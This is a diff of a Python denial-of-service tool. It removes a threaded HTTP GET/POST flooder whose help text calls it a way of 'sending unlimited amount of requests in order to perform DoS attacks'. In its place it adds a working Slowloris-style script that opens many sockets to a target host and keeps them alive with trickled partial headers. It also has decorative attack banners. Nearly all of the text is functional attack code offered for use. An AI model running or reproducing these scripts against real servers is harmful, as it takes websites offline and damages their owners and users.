@@ -1,149 +1,88 @@
+   #usr/bin/env python
+# -*- coding: utf-8 -*-
 import os
-import requests
 import sys
-import threading
 import random
-import re
-import argparse
+import time
 import fade
-os.system( 'clear' )
+import socket
+import getpass
+from progress.bar import Bar
+
+
+os.system("clear")
 logo = """
-\033[31m════════════════════════════════════════════════════════════════════════════════\033[0m
-         ████████▒▒         █████▒▒       ████████▒▒     ███████▒▒
-         ██▒▒    ██▒▒     ██▒▒   ██▒▒     ██▒▒  ██▒▒     ██▒▒
-         ██▒▒    ██▒▒     ██▒▒   ██▒▒     ██▒▒           ██▒▒
-         ██▒▒    ██▒▒     ██▒▒   ██▒▒     ██▒▒           ██▒▒
-         ██████▒▒         ██▒▒   ██▒▒     ████████▒▒     ██████▒▒
-         ██▒▒    ██▒▒     ██████ ██▒▒           ██▒▒     ██▒▒
-         ██▒▒    ██▒▒     ██▒▒   ██▒▒           ██▒▒     ██▒▒
-         ████████▒▒       ██▒▒   ██▒▒     ████████▒▒     ████████▒▒
-█████▒▒█▒▒     █▒▒██████▒▒█████▒▒   █████▒▒ ██▒▒  █▒▒█▒▒████▒▒ ████▒▒█████▒▒
-█▒▒    █▒▒     █▒▒  █▒▒   █▒▒       █▒▒     █▒█▒▒ █▒▒█▒▒█▒▒ █▒▒█▒▒   █▒▒  █▒▒
-████▒▒ █▒▒     █▒▒  █▒▒   ████▒▒    █████▒▒ █▒▒█▒▒█▒▒█▒▒█▒▒ █▒▒███▒▒ █▒▒  █▒▒
-█▒▒    █▒▒     █▒▒  █▒▒   █▒▒           █▒▒ █▒▒ █▒█▒▒█▒▒████▒▒ █▒    ████▒▒
-█████▒▒██████▒▒█▒▒  █▒▒   █████▒▒   █████▒▒ █▒▒  ██▒▒█▒▒█▒▒    ████▒▒█▒▒  █▒▒
-\033[93m═══════════════════════════════════════════════════════════════════════════════ \033[0m
-\033[92m═══════════════════════════════════════════════════════════════════════════════ \033[0m
+
+
+
+
+
+
+
+
+
+
+
+████▒▒   ████▒▒     ████▒▒     ██████▒▒    ████████▒▒  ████████▒▒
+════════════════════════════════════════════════════════
 """
 faded_text = fade.fire(logo)
 print(faded_text)
-host=''
-headers_useragents=[]
-request_counter=0
-printedMsgs = []
-def printMsg(msg):
-        if msg not in printedMsgs:
-                print ("\n"+msg + " after %i requests" % request_counter)
-                printedMsgs.append(msg)
-def useragent_list():
-        global headers_useragents
-        headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-        headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-        headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-        return(headers_useragents)
-def randomString(size):
-        out_str = ''
-        for i in range(0, size):
-                a = random.randint(65, 90)
-                out_str += chr(a)
-        return(out_str)
-def initHeaders():
-        useragent_list()
-        global headers_useragents, additionalHeaders
-        headers = {
-                                'User-Agent': random.choice(headers_useragents),
-                                'Cache-Control': 'no-cache',
-                                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-                                'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
-                                'Keep-Alive': str(random.randint(110,120)),
-                                'Connection': 'keep-alive'
-                                }
-        if additionalHeaders:
-                for header in additionalHeaders:
-                        headers.update({header.split(":")[0]:header.split(":")[1]})
-        return headers
-def handleStatusCodes(status_code):
-        global request_counter
-        sys.stdout.write("\r%i \033[92mATTACK REQUEST SENT\033[0m" % request_counter)
-        sys.stdout.flush()
-        print("\033[34m  " +str(url)+ "  \033[33mB A S E - L7\033[0m")
-        sys.stdout.flush()
-        if status_code == 429:
-                        printMsg("You have been throttled")
-        if status_code == 500:
-                printedMsg("Status code 500 received")
-def sendGET(url):
-        global request_counter
-        headers = initHeaders()
+regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+                    "Accept-language: en-US,en,q=0.5"]
+
+def init_socket(ip,port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    s.connect((ip,int(port)))
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
+
+    for header in regular_headers:
+        s.send('{}\r\n'.format(header).encode('UTF-8'))
+
+    return s
+
+def main():
+    if len(sys.argv)<5:
+        print(("Usage: {} example.com Port Threads 2".format(sys.argv[0])))
+        return
+
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    socket_count= int(sys.argv[3])
+    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
+    timer = int(sys.argv[4])
+    socket_list=[]
+
+    for _ in range(int(socket_count)):
         try:
-                request_counter+=1
-                request = requests.get(url, headers=headers)
-                # print 'her'
-                handleStatusCodes(request.status_code)
-        except:
-                pass
-def sendPOST(url, payload):
-        global request_counter
-        headers = initHeaders()
-        try:
-                request_counter+=1
-                if payload:
-                        request = requests.post(url, data=payload, headers=headers)
-                else:
-                        request = requests.post(url, headers=headers)
-                handleStatusCodes(request.status_code)
-        except:
-                pass
-class SendGETThread(threading.Thread):
-        def run(self):
-                try:
-                        while True:
-                                global url
-                                sendGET(url)
-                except:
-                        pass
-class SendPOSTThread(threading.Thread):
-        def run(self):
-                try:
-                        while True:
-                                global url, payload
-                                sendPOST(url, payload)
-                except:
-                        pass
-# TODO:
-# check if the site stop responding and alert
-def main(argv):
-        parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. by: BaseL7')
-        parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
-        parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
-        parser.add_argument('-d', help='Specify data payload for POST request', default=None)
-        parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
-        parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
-        args = parser.parse_args()
-        global url, payload, additionalHeaders
-        additionalHeaders = args.ah
-        payload = args.d
-        if args.g:
-                url = args.g
-                for i in range(args.t):
-                        t = SendGETThread()
-                        t.start()
-        if args.p:
-                url = args.p
-                for i in range(args.t):
-                        t = SendPOSTThread()
-                        t.start()
-        if len(sys.argv)==1:
-                parser.print_help()
-                exit()
-if __name__ == "__main__":
-   main(sys.argv[1:])
+            s=init_socket(ip,port)
+        except socket.error:
+            break
+        socket_list.append(s)
+        next(bar)
+
+    bar.finish()
+
+    while True:
+        print(("\033[32m[÷]\033[31m▒▒\033[92m▒▒MORZE\033[33m▒▒REQUEST\033[31m▒▒SENT\033[37m▒::.".format(len(socket_list))))
+
+        for s in socket_list:
+            try:
+                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+            except socket.error:
+                socket_list.remove(s)
+
+        for _ in range(socket_count - len(socket_list)):
+            print(("\033[33m   {}:::\033[37m▒▒\033[33m▒▒CONNECT\033[96m▒▒THE\033[97m▒▒WEBS\033[31m▒▒\033[96m▒▒\033[35m::".format("\n")))
+            try:
+                s=init_socket(ip,port)
+                if s:
+                    socket_list.append(s)
+            except socket.error:
+                break
+
+        time.sleep(timer)
+
+if __name__=="__main__":
+    main()             
